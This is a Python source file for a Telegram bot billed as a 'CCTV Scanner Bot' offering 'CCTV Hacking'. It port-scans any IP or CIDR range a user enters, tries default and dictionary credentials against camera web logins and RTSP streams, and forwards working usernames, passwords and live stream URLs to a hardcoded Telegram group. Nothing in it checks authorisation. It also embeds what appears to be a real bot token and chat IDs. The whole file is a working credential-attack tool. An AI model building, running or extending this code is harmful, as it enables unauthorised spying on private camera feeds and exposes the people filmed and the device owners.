import socket
import ipaddress
import re
import concurrent.futures
import requests
import time
import os
import asyncio
import logging
import traceback
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import NetworkError, BadRequest, Conflict, TimedOut
from aiohttp import web, ClientSession

# Set up logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Hardcoded bot token
BOT_TOKEN = "8049406807:AAGhuUh9fOm5wt7OvTobuRngqY0ZNBMxlHE"
# Placeholder group ID
GROUP_ID = "-1002522049841"
# Admin chat ID
ADMIN_CHAT_ID = "6972264549"

# Global data storage
scan_results = {}
scan_locks = {}
message_ids = {}
scan_stop = {}
last_message_state = {}
awaiting_input = {}
recent_scans = []
start_time = time.time()
scan_expiry = {}
scan_queue = asyncio.Queue(maxsize=20)
scan_semaphore = asyncio.Semaphore(5)
lock_timeouts = {}

# Common CCTV ports
CCTV_PORTS = [80, 554, 8000, 8080, 8443]
UDP_PORTS = [37020]

# Port to service mapping
SERVICE_MAP = {
    80: "http", 554: "rtsp", 8000: "http-alt", 8080: "http-alt", 8443: "https-alt", 37020: "onvif"
}

# Extended default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""),
    ("root", "root"), ("root", ""), ("admin", "666666"),
    ("admin", "password"), ("user", "user"),
    ("admin", "123456"), ("admin", "admin123"), ("admin", "1234"),
    ("root", "12345"), ("user", "12345")
]

# Sample 500 combos for testing (expand to 50,000 via combos.txt)
PASSWORD_DICT = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666",
    "password123", "adminadmin", "root", "qwerty", "letmein", "welcome",
    "camera", "security", "000000", "111111", "123123", "abc123", "pass123"
]
BRUTE_COMBOS = [(u, p) for u in ["admin", "root", "user"] for p in PASSWORD_DICT + ["test" + str(i) for i in range(150)]]

# Known vulnerabilities
VULN_ALERTS = {
    80: "HTTP port open. Vulnerable to default credential brute-forcing. Change default passwords and enable MFA.",
    554: "RTSP port open. Unsecured streams may allow unauthorized video access. Secure with authentication.",
    8080: "HTTP-alt port open. Often used by CCTV web interfaces. Update firmware to patch vulnerabilities.",
    8000: "HTTP-alt port open. Check for weak credentials and update firmware.",
    8443: "HTTPS-alt port open. Ensure SSL certificates are valid and credentials are strong.",
    37020: "ONVIF discovery (UDP). May expose camera details. Restrict network access."
}

# HTTP server for health checks
async def health_check(request):
    client_ip = request.remote
    logger.info(f"Keep-alive ping received from {client_ip}")
    return web.Response(text="OK")

async def start_http_server():
    try:
        logger.info("Starting HTTP server for keep-alive...")
        app = web.Application()
        app.add_routes([web.get('/health', health_check)])
        port = int(os.getenv("KEEP_ALIVE_PORT", 8080))
        logger.info(f"Binding HTTP server to port {port}")
        runner = web.AppRunner(app)
        await runner.setup()
        for attempt in range(3):
            try:
                site = web.TCPSite(runner, '0.0.0.0', port)
                await site.start()
                logger.info(f"HTTP server started on port {port}")
                return runner
            except OSError as e:
                logger.error(f"Port {port} binding failed: {e}. Retrying...")
                await asyncio.sleep(2)
        raise Exception("Failed to bind port after 3 attempts")
    except Exception as e:
        logger.error(f"Failed to start HTTP server: {str(e)}")
        raise

# Validate IP address
def is_valid_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Detect camera model via HTTP
def detect_camera_model(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url, timeout=5, allow_redirects=False)
        headers = response.headers
        server = headers.get("Server", "Unknown")
        title = re.search(r"<title>(.*?)</title>", response.text, re.I)
        title = title.group(1) if title else "Unknown"
        return f"Server: {server}, Page Title: {title}"
    except requests.RequestException as e:
        logger.error(f"Error detecting camera model on {ip}:{port}: {e}")
        return "Unable to detect (connection error)"
    except Exception as e:
        logger.error(f"Unexpected error detecting camera model on {ip}:{port}: {e}")
        return "Unable to detect (unknown error)"

# Test default credentials (HTTP)
def test_default_creds(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            url = f"http://{ip}:{port}/login"
            response = requests.post(url, data={"username": username, "password": password}, timeout=5)
            if response.status_code == 200 and "login failed" not in response.text.lower():
                results.append(f"✅ HTTP Success: {username}:{password}")
            else:
                results.append(f"❌ HTTP Failed: {username}:{password}")
        except requests.RequestException as e:
            logger.error(f"Error testing creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ HTTP Error: {username}:{password} (connection error)")
        except Exception as e:
            logger.error(f"Unexpected error testing creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ HTTP Error: {username}:{password} (unknown error)")
    return results

# Test RTSP brute-forcing (initial scan)
async def test_rtsp_brute(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        is_valid, error = await validate_rtsp(ip, port, username, password)
        rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
        if is_valid:
            results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
        else:
            results.append(f"❌ RTSP Failed: {username}:{password} ({error})")
    is_valid, error = await validate_rtsp(ip, port, "", "")
    no_creds_url = f"rtsp://{ip}:{port}/live"
    if is_valid:
        results.append(f"✅ RTSP Success: No credentials (try {no_creds_url})")
    else:
        results.append(f"❌ RTSP Failed: No credentials ({error})")
    return results

# Validate RTSP credentials
async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\n"
        request += f"CSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        
        writer.write(request.encode('ascii'))
        await writer.drain()

        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        response_str = response.decode('ascii', errors='ignore')

        if "RTSP/1.0 200 OK" in response_str:
            writer.close()
            await writer.wait_closed()
            return True, "Success"
        elif "401 Unauthorized" in response_str:
            writer.close()
            await writer.wait_closed()
            return False, "Authentication failed"
        else:
            writer.close()
            await writer.wait_closed()
            return False, f"Unexpected response: {response_str[:50]}"

    except asyncio.TimeoutError:
        return False, "Connection timeout"
    except Exception as e:
        return False, str(e)

# Test ONVIF protocol
def test_onvif(ip, port):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        response = requests.get(url, timeout=5)
        return "ONVIF supported" if response.status_code == 200 else "ONVIF not detected"
    except requests.RequestException as e:
        logger.error(f"Error testing ONVIF on {ip}:{port}: {e}")
        return "Unable to detect ONVIF (connection error)"
    except Exception as e:
        logger.error(f"Unexpected error testing ONVIF on {ip}:{port}: {e}")
        return "Unable to detect ONVIF (unknown error)"

# Check cached scan results
def get_cached_scan(ip, chat_id):
    current_time = time.time()
    for scan in recent_scans:
        if scan["ip"] == ip and current_time - scan["timestamp"] <= 24 * 3600:
            scan_results[chat_id] = {
                "open": scan["open"],
                "closed_count": 0,
                "details": scan.get("details", {}),
                "mac": scan["mac"]
            }
            scan_expiry[chat_id] = current_time + 600
            return scan
    return None

# Clear stuck locks (admin only)
async def clear_locks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if str(chat_id) != ADMIN_CHAT_ID:
        await update.message.reply_text("⚠️ Only admin can use this command.")
        return

    scan_locks.clear()
    scan_stop.clear()
    message_ids.clear()
    last_message_state.clear()
    awaiting_input.clear()
    lock_timeouts.clear()
    while not scan_queue.empty():
        try:
            scan_queue.get_nowait()
            scan_queue.task_done()
        except asyncio.QueueEmpty:
            break
    logger.info(f"Admin cleared all locks and queue for chat_id {chat_id}")
    await update.message.reply_text("✅ All locks and queue cleared.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    keyboard = [
        [InlineKeyboardButton("🌐 IP Scanning (All 65,535 Ports)", callback_data=f"ip_scan_{chat_id}")],
        [InlineKeyboardButton("🎥 CCTV Hacking", callback_data=f"cctv_hack_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 **Blockbuster CCTV Scanner Bot** 🎬\n\n"
        "Choose an option:\n"
        "🌐 **IP Scanning**: Scan all 65,535 TCP ports (~10-20 min)\n"
        "🎥 **CCTV Hacking**: Scan camera ports (80, 554, 8000, 8080, 8443, 37020) & brute-force (~1-2 sec per IP)",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if chat_id in scan_locks and scan_locks[chat_id]:
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped.")
    else:
        await update.message.reply_text("⚠️ No scan in progress.")

async def get_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_time = time.time()
    valid_results = [res for res in recent_scans if current_time - res["timestamp"] <= 24 * 3600]
    if valid_results:
        result = "Recent scan results:\n"
        for res in valid_results:
            ports = [f"{port} ({proto})" for port, proto in res["open"]]
            mac = res.get("mac", "N/A")
            result += f"IP: {res['ip']}, Open ports: {', '.join(ports)}, MAC: {mac}, Scanned: {time.ctime(res['timestamp'])}\n"
    else:
        result = "No recent scan results available (within 24 hours)."
    await update.message.reply_text(result)

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    scan_count = len(recent_scans)
    await update.message.reply_text(f"Bot Stats:\nTotal Scans: {scan_count}")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = time.time() - start_time
    uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
    scan_count = len(recent_scans)
    queue_size = scan_queue.qsize()
    active_scans = sum(1 for lock in scan_locks.values() if lock)
    await update.message.reply_text(
        f"**Bot Status** 📊\n"
        f"Uptime: {uptime_str}\n"
        f"Total Scans: {scan_count}\n"
        f"Active Scans: {active_scans}\n"
        f"Queued Scans: {queue_size}",
        parse_mode="Markdown"
    )

# Port scanner function
def scan_port(ip, port, chat_id, protocol="tcp"):
    if scan_stop.get(chat_id, False):
        return None
    try:
        sock_type = socket.SOCK_DGRAM if protocol == "udp" else socket.SOCK_STREAM
        sock = socket.socket(socket.AF_INET, sock_type)
        sock.settimeout(0.5 if protocol == "tcp" else 1.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port, result == 0, protocol
    except socket.error as e:
        logger.error(f"Error scanning port {port} ({protocol}) on {ip}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error scanning port {port} ({protocol}) on {ip}: {e}")
        return None

# Single IP scan
async def scan_single_ip(ip, chat_id, update, context, is_cctv=False):
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ Invalid IP: {ip}")
        return

    cached = get_cached_scan(ip, chat_id)
    if cached:
        ports = [f"{port} ({proto})" for port, proto in cached["open"]]
        await update.message.reply_text(
            f"📜 Cached result for **{ip}** (Scanned: {time.ctime(cached['timestamp'])}):\n"
            f"Open ports: {', '.join(ports)}\nMAC: {cached['mac']}",
            parse_mode="Markdown"
        )
        return

    async with scan_semaphore:
        try:
            scan_locks[chat_id] = True
            lock_timeouts[chat_id] = time.time() + (120 if is_cctv else 1200)
            scan_stop[chat_id] = False
            scan_results[chat_id] = {"open": [], "closed_count": 0, "details": {}, "mac": "N/A"}
            scan_expiry[chat_id] = time.time() + 600

            if is_cctv:
                scan_ports = [(p, "tcp") for p in CCTV_PORTS] + [(p, "udp") for p in UDP_PORTS]
                eta_text = "~1-2 sec"
                max_workers = 10  # Reduced for memory
            else:
                scan_ports = [(p, "tcp") for p in range(1, 65536)] + [(p, "udp") for p in UDP_PORTS]
                eta_text = "~10-20 min"
                max_workers = 100
            total_ports = len(scan_ports)

            logger.info(f"Scanning {ip}: {total_ports} ports ({len(scan_ports) - len(UDP_PORTS)} TCP + {len(UDP_PORTS)} UDP)")

            start_time = time.time()
            msg = await update.message.reply_text(
                f"🔍 {'CCTV' if is_cctv else 'IP'} Scanning **{ip}** [0%] (ETA: {eta_text}, {total_ports} ports)",
                parse_mode="Markdown"
            )
            message_ids[chat_id] = msg.message_id
            last_message_state[chat_id] = {"text": "", "open": 0, "closed": 0}

            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(scan_port, ip, port, chat_id, proto) for port, proto in scan_ports]
                completed = 0
                update_interval = max(total_ports // 10, 1 if is_cctv else 1000)
                for future in concurrent.futures.as_completed(futures):
                    if scan_stop.get(chat_id, False):
                        break
                    result = future.result()
                    completed += 1
                    if result:
                        port, is_open, protocol = result
                        if is_open:
                            scan_results[chat_id]["open"].append((port, protocol))
                            details = {}
                            if is_cctv and protocol == "tcp" and port in CCTV_PORTS:
                                details["model"] = detect_camera_model(ip, port)
                                details["creds"] = test_default_creds(ip, port)
                                details["onvif"] = test_onvif(ip, port)
                            if is_cctv and protocol == "tcp" and port == 554:
                                details["rtsp"] = await test_rtsp_brute(ip, port)
                            if is_cctv and protocol == "udp" and port == 37020:
                                details["onvif"] = "ONVIF discovery active (UDP)"
                            scan_results[chat_id]["details"][(port, protocol)] = details
                        else:
                            scan_results[chat_id]["closed_count"] += 1
                    if completed % update_interval == 0:
                        progress = (completed / total_ports) * 100
                        elapsed = time.time() - start_time
                        eta = (elapsed / completed * total_ports - elapsed) if completed > 0 else 0
                        await update_buttons(chat_id, context, ip, progress, eta if not is_cctv else 0, "cctv" if is_cctv else "ip")

            if scan_stop.get(chat_id, False):
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_ids[chat_id],
                    text=f"🛑 Scan stopped for **{ip}**",
                    parse_mode="Markdown"
                )
                return

            await update_buttons(chat_id, context, ip, 100, 0, "cctv" if is_cctv else "ip", completed=True)
            if scan_results[chat_id]["open"]:
                ports = [f"{port} ({proto})" for port, proto in scan_results[chat_id]["open"]]
                group_msg = f"Scan result for {ip}:\nOpen ports: {', '.join(ports)}\nMAC: {scan_results[chat_id]['mac']}\nScanned: {time.ctime()}"
                try:
                    await context.bot.send_message(chat_id=GROUP_ID, text=group_msg)
                    logger.info(f"Sent scan result to group {GROUP_ID}")
                except Exception as e:
                    logger.error(f"Error sending to group: {e}")
                    await update.message.reply_text(f"⚠️ Could not send to group chat: {str(e)}. Please add bot to group.")
                recent_scans.append({
                    "ip": ip,
                    "open": scan_results[chat_id]["open"],
                    "details": scan_results[chat_id]["details"],
                    "mac": scan_results[chat_id]["mac"],
                    "timestamp": time.time()
                })
            elif is_cctv:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_ids[chat_id],
                    text=f"⚠️ No camera ports found for **{ip}**. Try another IP or check if the device is online.",
                    parse_mode="Markdown"
                )

        except Exception as e:
            logger.error(f"Scan error for {ip}: {str(e)}\nStack trace: {traceback.format_exc()}")
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_ids[chat_id],
                text=f"⚠️ Scan failed for **{ip}**: {str(e)}\nTry another IP or check network.",
                parse_mode="Markdown"
            )
        finally:
            scan_locks.pop(chat_id, None)
            scan_stop.pop(chat_id, None)
            message_ids.pop(chat_id, None)
            last_message_state.pop(chat_id, None)
            awaiting_input.pop(chat_id, None)
            lock_timeouts.pop(chat_id, None)
            logger.info(f"Cleaned up scan state for chat_id {chat_id}")

# CIDR Range scan
async def scan_cidr(cidr, chat_id, update, context, is_cctv=False):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        await update.message.reply_text(
            f"🌐 Scanning **{cidr}** ({net.num_addresses} IPs)...", parse_mode="Markdown"
        )
        for ip in net.hosts():
            if scan_stop.get(chat_id, False):
                break
            await scan_single_ip(str(ip), chat_id, update, context, is_cctv=is_cctv)
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")
        scan_locks.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        logger.info(f"Cleaned up scan state for chat_id {chat_id}")

# Hunt Password feature
async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    _, ip, port = query.data.split("_")
    port = int(port)

    potential_links = context.user_data.get(f"potential_links_{chat_id}", [])
    if not potential_links:
        await query.message.reply_text("No RTSP links to brute-force. Run CCTV hack again.")
        return

    await query.message.reply_text(f"🔥 Starting brute-force on {ip}:{port} with {len(BRUTE_COMBOS)} combos...")

    total_combos = len(BRUTE_COMBOS)
    checked = 0
    live_links = []
    progress_message = await query.message.reply_text(f"Progress: Checked {checked}/{total_combos} combos")

    for rtsp_url, _, _ in potential_links:
        for username, password in BRUTE_COMBOS:
            if scan_stop.get(chat_id, False):
                await context.bot.edit_message_text(
                    chat_id=progress_message.chat_id,
                    message_id=progress_message.message_id,
                    text=f"🛑 Brute-force stopped! Checked {checked}/{total_combos} combos"
                )
                return
            is_valid, error = await validate_rtsp(ip, port, username, password)
            checked += 1

            if checked % 100 == 0:
                try:
                    await context.bot.edit_message_text(
                        chat_id=progress_message.chat_id,
                        message_id=progress_message.message_id,
                        text=f"Progress: Checked {checked}/{total_combos} combos"
                    )
                except Exception as e:
                    logger.error(f"Error updating progress: {e}")

            if is_valid:
                new_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                live_links.append(new_url)
                await query.message.reply_text(
                    f"🎯 Found working creds!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                )
                try:
                    await context.bot.send_message(
                        chat_id=GROUP_ID,
                        text=f"🎯 Found working creds for {ip}:{port}!\nUsername: {username}\nPassword: {password}\nURL: {new_url}"
                    )
                except Exception as e:
                    logger.error(f"Error sending to group: {e}")

    await context.bot.edit_message_text(
        chat_id=progress_message.chat_id,
        message_id=progress_message.message_id,
        text=f"✅ Brute-force complete! Checked {checked}/{total_combos} combos"
    )

    if live_links:
        await query.message.reply_text(
            f"🎉 Brute-force Successful! Found {len(live_links)} live links:\n" + "\n".join(live_links)
        )
    else:
        await query.message.reply_text("❌ No new live links found. Try another IP/port.")

# Live button updater
async def update_buttons(chat_id, context, ip, progress, eta, scan_type, completed=False):
    open_ports = len(scan_results.get(chat_id, {}).get("open", []))
    closed_ports = scan_results.get(chat_id, {}).get("closed_count", 0)
    eta_text = f", ETA: {int(eta // 60)}m {int(eta % 60)}s" if eta > 0 else ""
    progress_text = f"🔍 {scan_type.upper()} Scanning **{ip}** [{progress:.1f}%{eta_text}]"

    last_state = last_message_state.get(chat_id, {"text": "", "open": -1, "closed": -1})
    if (last_state["text"] == progress_text and
        last_state["open"] == open_ports and
        last_state["closed"] == closed_ports and
        not completed):
        return

    keyboard = [
        [InlineKeyboardButton(f"🟢 Open Ports: {open_ports}", callback_data=f"open_{chat_id}")],
        [InlineKeyboardButton(f"🔴 Closed Ports: {closed_ports}", callback_data=f"closed_{chat_id}")],
        [InlineKeyboardButton("🛑 Cancel", callback_data=f"cancel_{chat_id}")]
    ]
    if completed and scan_type == "cctv":
        keyboard.append([InlineKeyboardButton("🔥 Hunt Password", callback_data=f"hunt_{ip}_554")])
        context.user_data[f"potential_links_{chat_id}"] = [
            (f"rtsp://{u}:{p}@{ip}:554/live", u, p) for u, p in DEFAULT_CREDS
        ] + [(f"rtsp://{ip}:554/live", "", "")]

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_ids[chat_id],
            text=progress_text,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
        last_message_state[chat_id] = {"text": progress_text, "open": open_ports, "closed": closed_ports}
    except Exception as e:
        if "Message is not modified" not in str(e):
            logger.error(f"Error updating buttons: {e}")

# Button click handler
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    logger.info(f"Button clicked: chat_id={chat_id}, data={query.data}")

    try:
        if query.data.startswith("ip_scan_"):
            awaiting_input[chat_id] = "ip_scan"
            await query.message.reply_text(
                "🌐 Enter an IP or CIDR range for full 65,535 port scan (e.g., `192.168.1.1` or `192.168.1.0/24`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("cctv_hack_"):
            awaiting_input[chat_id] = "cctv_hack"
            await query.message.reply_text(
                "🎥 Enter an IP or CIDR range for CCTV hacking (e.g., `192.168.1.1` or `192.168.1.0/24`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("hunt_"):
            await hunt_password(update, context)
        elif query.data.startswith("cancel_"):
            if chat_id in scan_locks and scan_locks[chat_id]:
                scan_stop[chat_id] = True
                scan_locks.pop(chat_id, None)
                message_ids.pop(chat_id, None)
                last_message_state.pop(chat_id, None)
                lock_timeouts.pop(chat_id, None)
                await query.message.edit_text(
                    text=f"🛑 Scan stopped for **{query.data.split('_')[1]}**",
                    parse_mode="Markdown"
                )
            else:
                await query.message.reply_text("⚠️ No scan in progress.")
        elif query.data.startswith(("open_", "closed_")):
            action, button_chat_id = query.data.split("_", 1)
            if button_chat_id != str(chat_id):
                await query.message.reply_text("⚠️ Chat ID mismatch. Please start a new scan.")
                return

            if chat_id not in scan_results or time.time() > scan_expiry.get(chat_id, 0):
                await query.message.reply_text("⚠️ Scan data expired or not found. Please start a new scan.")
                return

            if action == "open":
                open_ports = scan_results[chat_id].get("open", [])
                if not open_ports:
                    await query.message.reply_text("🟢 No Open Ports Found!")
                else:
                    ports_text = []
                    for port, protocol in sorted(open_ports):
                        port_info = f"✅ Port {port} ({protocol.upper()}): {SERVICE_MAP.get(port, 'unknown')} (open)"
                        if (port, protocol) in scan_results[chat_id]["details"]:
                            details = scan_results[chat_id]["details"][(port, protocol)]
                            if "model" in details:
                                port_info += f"\n  - Model: {details['model']}"
                            if "creds" in details:
                                port_info += f"\n  - HTTP Credentials: {', '.join(details['creds'])}"
                            if "rtsp" in details:
                                port_info += f"\n  - RTSP Brute: {', '.join(details['rtsp'])}"
                            if "onvif" in details:
                                port_info += f"\n  - ONVIF: {details['onvif']}"
                        if port in VULN_ALERTS:
                            port_info += f"\n  - ⚠️ {VULN_ALERTS[port]}"
                        ports_text.append(port_info)
                    mac = scan_results[chat_id].get("mac", "N/A")
                    await query.message.reply_text(
                        f"**🟢 Open Ports:**\n" + "\n".join(ports_text) + f"\n\n**MAC Address**: {mac}",
                        parse_mode="Markdown"
                    )
            elif action == "closed":
                closed_count = scan_results[chat_id].get("closed_count", 0)
                if closed_count == 0:
                    await query.message.reply_text("🔴 No Closed Ports Found!")
                else:
                    await query.message.reply_text(
                        f"**🔴 Closed Ports:** {closed_count}\n(Too many to list individually)", parse_mode="Markdown"
                    )

    except Exception as e:
        logger.error(f"Error in button_click: {e}")
        await query.message.reply_text(f"⚠️ Error processing button: {str(e)}")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Bot error: {str(e)}"
            )
        except Exception as admin_e:
            logger.error(f"Failed to notify admin: {admin_e}")

# Handle user input
async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id

    current_time = time.time()
    if chat_id in lock_timeouts and current_time > lock_timeouts[chat_id]:
        logger.info(f"Clearing timed out lock for chat_id {chat_id}")
        scan_locks.pop(chat_id, None)
        scan_stop.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        awaiting_input.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)

    if scan_locks.get(chat_id, False):
        logger.info(f"Canceling previous scan for chat_id {chat_id}")
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped. Starting new scan...")
        await asyncio.sleep(1)

    if chat_id not in awaiting_input:
        await update.message.reply_text("⚠️ Please use /start to choose an option.")
        return

    target = update.message.text.strip()
    mode = awaiting_input[chat_id]

    logger.info(f"Starting new scan: mode={mode}, ip={target}, chat_id={chat_id}")
    try:
        if mode == "ip_scan":
            if "/" in target:
                await scan_cidr(target, chat_id, update, context, is_cctv=False)
            else:
                await scan_single_ip(target, chat_id, update, context, is_cctv=False)
        elif mode == "cctv_hack":
            if "/" in target:
                await scan_cidr(target, chat_id, update, context, is_cctv=True)
            else:
                await scan_single_ip(target, chat_id, update, context, is_cctv=True)
    except Exception as e:
        logger.error(f"Error starting new scan for chat_id {chat_id}: {str(e)}")
        await update.message.reply_text(f"⚠️ Scan failed: {str(e)}")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Scan error for chat {chat_id}: {str(e)}"
            )
        except Exception as admin_e:
            logger.error(f"Failed to notify admin: {admin_e}")

async def process_scan_queue(app):
    logger.info("Starting scan queue processor")
    while True:
        try:
            async with asyncio.timeout(1200):
                mode, target, chat_id, update, context = await scan_queue.get()
                logger.info(f"Processing scan queue task: mode={mode}, ip={target}, chat_id={chat_id}")
                try:
                    if mode == "ip_scan":
                        if "/" in target:
                            await scan_cidr(target, chat_id, update, context, is_cctv=False)
                        else:
                            await scan_single_ip(target, chat_id, update, context, is_cctv=False)
                    elif mode == "cctv_hack":
                        if "/" in target:
                            await scan_cidr(target, chat_id, update, context, is_cctv=True)
                        else:
                            await scan_single_ip(target, chat_id, update, context, is_cctv=True)
                finally:
                    scan_queue.task_done()
                    logger.info(f"Completed scan queue task for chat_id {chat_id}")
                await asyncio.sleep(1)
        except asyncio.TimeoutError:
            logger.error(f"Scan queue task timed out for chat_id {chat_id}")
            try:
                await app.bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ Scan timed out. Please try again."
                )
                await app.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"⚠️ Scan queue timeout for chat {chat_id}"
                )
            except Exception as admin_e:
                logger.error(f"Failed to notify: {admin_e}")
            scan_queue.task_done()
        except Exception as e:
            logger.error(f"Error processing scan queue: {e}")
            try:
                await app.bot.send_message(
                    chat_id=chat_id,
                    text=f"⚠️ Scan failed: {str(e)}"
                )
                await app.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"⚠️ Scan queue error for chat {chat_id}: {str(e)}"
                )
            except Exception as admin_e:
                logger.error(f"Failed to notify: {admin_e}")
            scan_queue.task_done()
        await asyncio.sleep(1)

async def check_group_access(bot):
    try:
        await bot.get_chat(GROUP_ID)
        logger.info(f"Group {GROUP_ID} accessible")
    except Exception as e:
        logger.error(f"Group {GROUP_ID} not accessible: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    if isinstance(context.error, (NetworkError, TimedOut)):
        await asyncio.sleep(5)
    elif isinstance(context.error, BadRequest):
        logger.error(f"BadRequest: {context.error}")
    elif isinstance(context.error, Conflict):
        logger.error(f"Conflict error: {context.error}")
        try:
            await context.bot.delete_webhook(drop_pending_updates=True)
            logger.info("Webhook cleared due to conflict")
        except Exception as e:
            logger.error(f"Failed to clear webhook: {str(e)}")
    elif str(context.error).startswith("TooManyRequests"):
        logger.warning("Telegram rate limit hit, applying backoff")
        await asyncio.sleep(2 ** len(str(context.error)))
    try:
        if update:
            await update.message.reply_text("⚠️ An error occurred, please try again later.")
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"⚠️ Bot error: {str(context.error)}"
        )
    except Exception as admin_e:
        logger.error(f"Failed to notify admin: {admin_e}")

async def main():
    logger.info("Bot starting...")
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        logger.info(f"Bot initialized with token: {BOT_TOKEN[:10]}...")
    except Exception as e:
        logger.error(f"Error initializing bot: {str(e)}")
        raise

    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        logger.info("Webhook cleared at startup")
    except Exception as e:
        logger.error(f"Failed to clear webhook at startup: {str(e)}")

    await check_group_access(app.bot)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("getports", get_ports))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearlocks", clear_locks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, scan))
    app.add_handler(CallbackQueryHandler(button_click))
    app.add_error_handler(error_handler)

    http_runner = await start_http_server()

    max_retries = 10
    retry_delay = 10
    for attempt in range(max_retries):
        try:
            await app.initialize()
            await app.start()
            await app.updater.start_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            logger.info("Bot polling started")
            asyncio.create_task(process_scan_queue(app))
            break
        except Exception as e:
            logger.error(f"Error starting Telegram bot (attempt {attempt + 1}/{max_retries}): {str(e)}")
            if attempt < max_retries - 1:
                logger.info(f"Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
            else:
                logger.error("Max retries reached, shutting down...")
                await http_runner.cleanup()
                raise

    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        logger.info("Shutting down...")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        await http_runner.cleanup()
        logger.info("Shutdown complete")

if __name__ == "__main__":
    asyncio.run(main())
